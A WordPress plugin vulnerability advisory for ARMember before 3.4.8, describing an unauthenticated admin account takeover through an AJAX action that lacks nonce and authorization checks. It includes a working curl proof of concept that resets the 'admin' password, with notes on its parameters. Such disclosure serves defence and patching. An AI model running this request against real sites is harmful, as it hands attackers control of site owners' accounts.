## WordPress Plugin Vulnerabilities

# ARMember < 3.4.8 - Unauthenticated Admin Account Takeover

### Description

The plugin is vulnerable to account takeover (even the administrator) due to missing nonce and authorization checks in an AJAX action available to unauthenticated users, allowing them to change the password of arbitrary users by knowing their username

### Proof of Concept

curl 'https://example.com/wp-admin/admin-ajax.php' \
--data 'action=arm\_shortcode\_form\_ajax\_action&user\_pass=newpassword&repeat\_pass=newpassword&arm\_action=change-password&key2=x&action2=rp&login2=admin'
Notes:
+ The `login2` parameter corresponds to the username to change the password for (in our case it's the "admin" user)
+ The `user\_pass` and `repeat\_pass` correspond to the new password to be set (both fields must be set to the same password)
